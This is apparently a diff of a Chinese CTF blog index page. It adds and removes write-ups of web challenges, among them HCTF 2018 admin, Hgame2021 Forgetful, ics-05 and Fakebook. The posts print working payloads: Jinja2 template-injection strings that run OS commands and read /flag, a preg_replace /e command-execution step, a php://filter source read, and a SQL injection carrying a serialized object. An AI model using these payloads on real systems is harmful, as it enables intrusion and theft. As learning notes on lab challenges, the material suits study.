@@ -158,6 +158,370 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/23/HCTF-2018-admin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/23/HCTF-2018-admin/" class="post-title-link" itemprop="url">HCTF-2018-admin</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-23 15:53:35 / 修改时间：21:21:06" itemprop="dateCreated datePublished" datetime="2021-02-23T15:53:35+08:00">2021-02-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h4><h5 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h5><h5 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h5><p>又是学习dalao操作的一天：</p>
+<h6 id="一、flask-session-伪造"><a href="#一、flask-session-伪造" class="headerlink" title="一、flask session 伪造"></a>一、flask session 伪造</h6><p><img src="/images/HCTF-2018-admin/image-20210223155455900.png" alt="image-20210223155455900"></p>
+<p>应该是要获取admin的账号……网页通过session识别用户的身份：</p>
+<blockquote>
+<p>session是浏览器与服务器交互的会话，这个session可以来验证访问者的身份，大多数的session都是保存在服务器的，但是也有少部分是客户端session，如flask框架。</p>
+<p>传统PHP中session都是被放在服务器中的，用户只是看到一串随机字符串，真正的session内容在服务器中，flask是一个python轻量级web框架，他的session存储在客户端的cookie字段中，为了防止session篡改，flask进行了一定的处理，代码存放在flask模块中sessions.py文件中。</p>
+</blockquote>
+<p>flask session 的加解密需要一个secret-key：</p>
+<p><img src="/images/HCTF-2018-admin/image-20210223162658801.png" alt="image-20210223162658801"></p>
+<p>源码中的config文件中可以被找到</p>
+<p>用 flask-session-cookie-manager 对cookie进行解密：</p>
+<blockquote>
+<p>解密：</p>
+<p>python flask_session_cookie_manager3.py decode -s SECRET_KEY -c “session”</p>
+<p>加密：</p>
+<p>python flask_session_cookie_manager3.py encode -s SECRET_KEY -t “未加密session”</p>
+</blockquote>
+<p><img src="/images/HCTF-2018-admin/image-20210223163102049.png" alt="image-20210223163102049"></p>
+<p>在index中：</p>
+<p><img src="/images/HCTF-2018-admin/image-20210223163300325.png" alt="image-20210223163300325"></p>
+<p>只验证了session中的’name’即可：</p>
+<p><img src="/images/HCTF-2018-admin/image-20210223163402723.png" alt="image-20210223163402723"></p>
+<p>修改cookie即可以admin身份登录获取flag……</p>
+<h6 id="二、Unicode欺骗"><a href="#二、Unicode欺骗" class="headerlink" title="二、Unicode欺骗"></a>二、Unicode欺骗</h6><p><img src="/images/HCTF-2018-admin/image-20210223171235841.png" alt="image-20210223171235841"></p>
+<p>在change页面可以清楚的看到，对获取到的name进行了小写处理。python中含有小写函数：lower()</p>
+<p>这里用的是strlower：</p>
+<p><img src="/images/HCTF-2018-admin/image-20210223173046053.png" alt="image-20210223173046053"></p>
+<p>用到了nodeprepare.prepare，这个方法从Twisted库中导出：</p>
+<p><img src="/images/HCTF-2018-admin/image-20210223175220075.png" alt="image-20210223175220075"></p>
+<p>这里的Twisted版本很低，dalao怀疑这里有漏洞……搜索了一下相关内容：</p>
+<p><a target="_blank" rel="noopener" href="https://engineering.atspotify.com/2013/06/18/creative-usernames/%E4%B8%AD%E8%AE%B0%E5%BD%95%E4%BA%86%E5%9B%A0%E4%B8%BA%E4%BD%BF%E7%94%A8nodeprepare.prepare%E5%AF%BC%E8%87%B4%E7%9A%84%E4%B8%80%E8%B5%B7%E6%BC%8F%E6%B4%9E%E3%80%82%E6%B3%A8%E5%86%8C%E6%97%B6%EF%BC%8C">https://engineering.atspotify.com/2013/06/18/creative-usernames/中记录了因为使用nodeprepare.prepare导致的一起漏洞。注册时，</a> ‘ᴮᴵᴳᴮᴵᴿᴰ’经处理得到‘BIGBIRD’，就成功注册了‘BIGBIRD’账户，但在修改密码时，再次对name使用了nodeprepare.prepare。那么修改的账户就变成‘bigbird’，原来的bigbird账户的密码就被控制了。官方的原话为：</p>
+<blockquote>
+<p><em>”We were relying on nodeprep.prepare being idempotent, and it wasn’t.“</em></p>
+</blockquote>
+<p>转化为小写的函数原本应当是幂等的，但在这个特殊情况下，两次的结果是不同的。</p>
+<p>在<a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=5902506%E7%9A%84%E8%AE%A8%E8%AE%BA%E4%B8%AD%EF%BC%9A">https://news.ycombinator.com/item?id=5902506的讨论中：</a></p>
+<p><img src="/images/HCTF-2018-admin/image-20210223180727395.png" alt="image-20210223180727395"></p>
+<p>似乎是python的工作方式的改变破坏了Twisted库。</p>
+<p>或许是因为某些原因导致不支持ᴮᴵᴳᴮᴵᴿᴰ字符，进行了强制的转换？到这里我仍不是很明白。<a target="_blank" rel="noopener" href="https://paper.seebug.org/77/">Unicode同形字引起的安全问题</a>中介绍了关于Unicode转ASCII的GitHub的漏洞，但不是ᴬᴰᴹᴵᴺ到ADMIN的转换。</p>
+<p>我找到了Unicode的标准化处理：</p>
+<blockquote>
+<p>unicodedata.normalize(form, unistr)</p>
+<p>把一串UNICODE字符串转换为普通格式的字符串，具体格式支持NFC、NFKC、NFD和NFKD格式。</p>
+<p>Unicode标准定义了四种规范化形式： Normalization Form D (NFD)，Normalization Form KD (NFKD)，Normalization Form C (NFC)，和Normalization Form KC (NFKC)。大约来说，NFD和NFKD将可能的字符进行分解，而NFC和NFKC将可能的字符进行组合。</p>
+<p>NFC（Normalization Form C）使用最少的码位构成等价的字符串；<br>NFD把组合字符分解成基字符和单独的组合字符；</p>
+<p>在另外两个规范化形式（NFKC和NFKD）的首字母缩略词中，字母K表示“compatibility”（兼容性）。这两种是<strong>较严格</strong>的规范形式，<strong>对“兼容字符”有影响</strong>。</p>
+<p>=》<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38492159/article/details/107135663">https://blog.csdn.net/weixin_38492159/article/details/107135663</a></p>
+</blockquote>
+<p><img src="/images/HCTF-2018-admin/image-20210223210605583.png" alt="image-20210223210605583"></p>
+<p>NFKC和NFKD下，都会转换为ADMIN；NFC和NFD下，仍为ᴬᴰᴹᴵᴺ。</p>
+<p>大概是该方法在遇到ᴬᴰᴹᴵᴺ时，因为某些原因只进行了规范化而没有转化为小写导致了漏洞吧……更深的就不知道了……</p>
+<p>p大：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>关于Unicode安全的好像有一道Unicode shop，回来可以写写。</p>
+<h6 id="三、条件竞争"><a href="#三、条件竞争" class="headerlink" title="三、条件竞争"></a>三、条件竞争</h6><p>……确实不是很懂，先贴dalao题解，学习学习：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086">https://www.anquanke.com/post/id/164086</a></p>
+<p>……wohaocai</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/18/Hgame2021-week3-Forgetful/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/18/Hgame2021-week3-Forgetful/" class="post-title-link" itemprop="url">Hgame2021-week3-Forgetful</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-18 14:44:58" itemprop="dateCreated datePublished" datetime="2021-02-18T14:44:58+08:00">2021-02-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-26 23:30:00" itemprop="dateModified" datetime="2021-02-26T23:30:00+08:00">2021-02-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h4><blockquote>
+<p>记录一下学习过程：</p>
+</blockquote>
+<h6 id="1-题目：Liki-总是忘记很多事情，于是她灵机一动，用新学会的-Python-写了一个-TodoList，快用起来吧！"><a href="#1-题目：Liki-总是忘记很多事情，于是她灵机一动，用新学会的-Python-写了一个-TodoList，快用起来吧！" class="headerlink" title="1.题目：Liki 总是忘记很多事情，于是她灵机一动，用新学会的 Python 写了一个 TodoList，快用起来吧！"></a>1.题目：Liki 总是忘记很多事情，于是她灵机一动，用新学会的 Python 写了一个 TodoList，快用起来吧！</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV17V411i7hA?p=1&share_medium=android&share_plat=android&share_source=QQ&share_tag=s_i&timestamp=1612688253&unique_k=HP72IG">讲解</a></p>
+<p>页面有一个记录的功能，可以记录一些事项：</p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210218144958771.png" alt="image-20210218144958771"></p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210218145011934.png" alt="image-20210218145011934"></p>
+<p>查看后发现7*7被执行了，存在SSTI……</p>
+<p>跟着步骤实验：</p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210218145203719.png" alt="image-20210218145203719"></p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210218145222789.png" alt="image-20210218145222789"></p>
+<p>看到了许多类名：</p>
+<blockquote>
+<p>__class__  返回type类型，查看对象的类型<br>__bases__  返回tuple类型，列出该类的基类<br><em>_mro_\</em>    返回tuple类型，给出解析方法调用的顺序<br><em>_subclasses_\</em>()  返回内建方法builtin_function_or_method，获取一个类的子类<br>__globals__  返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量</p>
+</blockquote>
+<p>那怎么从这么多的类中找到一个包含我们需要模块的一个类呢，用脚本吗……</p>
+<p>我随手登录的账号已经有了一位老哥的操作：</p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210219104825834.png" alt="image-20210219104825834"></p>
+<p>查了一下：</p>
+是一个方法，从中可以直接调用os执行命令……tql
+
+<p>安洵杯2020 官方Writeup：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>=》</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;))|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>print</code>绕过<code>&#123;&#123;&#125;&#125;</code>和<code>attr</code>绕过<code>.</code>，Unicode应该是绕过一些字符过滤。</p>
+<p>利用这个方法去读：</p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210219105812356.png" alt="image-20210219105812356"></p>
+<p>学长是用base64去读的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;base64 &#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以读取了：</p>
+<p><img src="/images/Hgame2021-week3-Forgetful/image-20210219110538824.png" alt="image-20210219110538824"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[165].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;base64 &#x2F;flag&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也ok</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/18/ics-05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/18/ics-05/" class="post-title-link" itemprop="url">ics-05</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-18 10:04:50 / 修改时间：10:45:50" itemprop="dateCreated datePublished" datetime="2021-02-18T10:04:50+08:00">2021-02-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p><strong>题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</strong></p>
+<p><img src="/images/ics-05/image-20210218102501966.png" alt="image-20210218102501966"></p>
+<p>题目里面就有设备维护中心这一个网页……点击发现有一个page参数，不是sql注入，大概是文件包含</p>
+<p><strong>?page=php://filter/read=convert.base64-encode/resource=index.php</strong></p>
+<p>读取网页源码：</p>
+<p><img src="/images/ics-05/image-20210218101133264.png" alt="image-20210218101133264"></p>
+<blockquote>
+<p>preg_replace($pattern, $replacement, $subject) 作用：</p>
+<p>搜索subject中匹配pattern的部分，以replacement的内容进行替换。 </p>
+<p>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。 </p>
+<p>$replacement: 用于替换的字符串或字符串数组。 </p>
+<p>$subject: 要搜索替换的目标字符串或字符串数组。</p>
+</blockquote>
+<p>学习一波preg_replace()的漏洞：</p>
+<blockquote>
+<p>preg_replace漏洞触发有两个前提：</p>
+<p>1：第一个参数需要e标识符，有了它可以执行第二个参数的命令</p>
+<p>2：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令</p>
+</blockquote>
+<p><img src="/images/ics-05/image-20210218102601447.png" alt="image-20210218102601447"></p>
+<p>查找flag所在的位置：&amp;rep=system(‘find+/+-name+flag.*’) ：</p>
+<p><img src="/images/ics-05/image-20210218104202681.png" alt="image-20210218104202681"></p>
+<p>&amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’)</p>
+<p>在页面render一直查不出来……还是要看源码：</p>
+<p><img src="/images/ics-05/image-20210218104539337.png" alt="image-20210218104539337"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/17/Bugku-Web-php-unserialize/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/17/Bugku-Web-php-unserialize/" class="post-title-link" itemprop="url">Bugku-Web_php_unserialize</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-17 11:00:16 / 修改时间：11:18:00" itemprop="dateCreated datePublished" datetime="2021-02-17T11:00:16+08:00">2021-02-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h4><h6 id="1-题目：https-adworld-xctf-org-cn-task-answer-type-web-amp-number-3-amp-grade-1-amp-id-5409-amp-page-1"><a href="#1-题目：https-adworld-xctf-org-cn-task-answer-type-web-amp-number-3-amp-grade-1-amp-id-5409-amp-page-1" class="headerlink" title="1.题目：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1"></a>1.题目：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a></h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p><img src="/images/Bugku-Web-php-unserialize/image-20210217110152094.png" alt="image-20210217110152094"></p>
+<p>var需要base64解密后绕过匹配，反序列化包含flag文件</p>
+<p>匹配函数对（[o或c]:[一个或多个数字] /i：不区分大小写）进行匹配，可以利用+解析为空格绕过</p>
+<p>由于private的属性，只能编写程序在内部base64编码：</p>
+<p><img src="/images/Bugku-Web-php-unserialize/image-20210217111740330.png" alt="image-20210217111740330"></p>
+<p>得到flag。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/16/Bugku%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -611,383 +975,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/" class="post-title-link" itemprop="url">网鼎杯-2018-Fakebook</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-02-12 12:27:01 / 修改时间：15:41:21" itemprop="dateCreated datePublished" datetime="2021-02-12T12:27:01+08:00">2021-02-12</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h4><h6 id="1-题目：序列化、sql注入"><a href="#1-题目：序列化、sql注入" class="headerlink" title="1.题目：序列化、sql注入"></a>1.题目：序列化、sql注入</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>进去是一个界面，可以注册用户，先注册一个……</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212122940706.png" alt="image-20210212122940706"></p>
-<p>扫描网站后台只扫到一个login.php，但是发现可以查看用户，提交了no参数进行查询，测试一下发现是sql注入</p>
-<p>现在遇见一个就觉得是盲注……结合之前写的脚本构造语句查了一些东西</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212123923079.png" alt="image-20210212123923079"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;1 and 1&#x3D;if()</span><br><span class="line">&#x2F;&#x2F;在if中用二分法逐位判断</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>database()：fakebook</p>
-<p>fakebook：users、test</p>
-<p>users：no、username、passwd、data、USER、CURRENT_CONNECTIONS……</p>
-</blockquote>
-<p>没什么特别鲜明的东西……查了这几个列发现就只有我注册的用户，没有admin啥的……data里面是序列化的数据，也许是突破口，但到这我就不会了……要去学一学</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212145816530.png" alt="image-20210212145816530"></p>
-<blockquote>
-<p><strong>序列化和反序列化的概念</strong></p>
-<p>序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。<br>反序列化则相反将字符串重新恢复成对象。<br>对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。</p>
-<p><strong>序列化中的魔法函数：</strong></p>
-<p>__construct() 创建对象时调用</p>
-<p>__destruct() 销毁对象时调用 </p>
-<p>__toString() 当一个对象被当作一个字符串使用</p>
-<p>__sleep() 在对象在被序列化之前运行 </p>
-<p>__wakeup 将在序列化之后立即被调用</p>
-</blockquote>
-<p>在<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1">攻防世界unserialize3</a>中：</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212134649258.png" alt="image-20210212134649258"></p>
-<p>应该对code进行了反序列化处理，然后程序是怎么处理的……可以看看这个文章：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化</a> em，反序列化时对应的变量被赋值，如果有则会先执行wakeup()方法。</p>
-<p>如果进入xctf的话会先进入wakeup，然后退出，所以这里需要绕过：使属性个数大于实际个数。</p>
-<p>再回来这道题：好像没啥思路了……</p>
-<p>writeup里说有robots.txt，为什么我扫不出来嘞……</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212145839928.png" alt="image-20210212145839928"></p>
-<p>getcontents应该可以读本地的文件：</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212145852832.png" alt="image-20210212145852832"></p>
-<p>相应的对blog的地址设置了过滤：</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212150212331.png" alt="image-20210212150212331"></p>
-<p>报错显示了文件的路径：</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212150413263.png" alt="image-20210212150413263"></p>
-<p>?no=0/**/union/**/select 1,2,3,4可以正常回显……这不是绕过空格过滤的吗……我只想到了盲注</p>
-<p>这样就可以绕过过滤了。</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212151853109.png" alt="image-20210212151853109"></p>
-<p>构造：</p>
-<p>?no=0/**/union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;s:1:”1”;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212152411763.png" alt="image-20210212152411763"></p>
-<p>应该是flag了：</p>
-<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210212152503535.png" alt="image-20210212152503535"></p>
-<p>案例：</p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/161120">CTF PHP反序列化漏洞</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/piaomiaohongchen/p/10923067.html">五个demo案例带你学习PHP反序列化漏洞</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ncafei/article/details/62044552">高级SQL注入：混淆和绕过</a>（mark）</p>
-<p>🆗</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/10/BJDCTF2020-Easy-MD5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/10/BJDCTF2020-Easy-MD5/" class="post-title-link" itemprop="url">BJDCTF2020-Easy-MD5</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-02-10 15:55:36 / 修改时间：18:07:24" itemprop="dateCreated datePublished" datetime="2021-02-10T15:55:36+08:00">2021-02-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><h6 id="1-题目：MD5绕过"><a href="#1-题目：MD5绕过" class="headerlink" title="1.题目：MD5绕过"></a>1.题目：MD5绕过</h6><h6 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h6><p>LazyDogR4U和Post to zuckonit的MD5是没怎么接触过的……就挑一道MD5的题写叭……</p>
-<p>结果一上来就是：</p>
-<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210160914735.png" alt="image-20210210160914735"></p>
-<p>pass应该是可以控制的变量……构造MD5后的变量</p>
-<p>*<em>md5(\</em>string,raw*)**：</p>
-<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210161233308.png" alt="image-20210210161233308"></p>
-<p>但我折腾半天，网上写的都是什么mysql解释16进制、ASCII编码成字符串、hex之类的……看得不是很懂</p>
-<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210174311851.png" alt="image-20210210174311851"></p>
-<p>反正直接就出了，所以应该讨论的是：MD5的32位密文与16位密文的转换。</p>
-<blockquote>
-<p>md5的输出只有128bit一种<br>32个byte，或者32个ascii可显示字符形du式的是zhi其hex码的显示形式<br>16个byte是其直dao接输出形式。<br>16*8=128bit<br>这里只要把每4bit用一个char表示，就成了32个byte的可打印显示形式</p>
-</blockquote>
-<p>这里的理解为写脚本（抄脚本）产生了一定的阻碍……</p>
-<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210175411054.png" alt="image-20210210175411054"></p>
-<p>找了几个脚本碰撞，结果碰了一上午也没碰出来……</p>
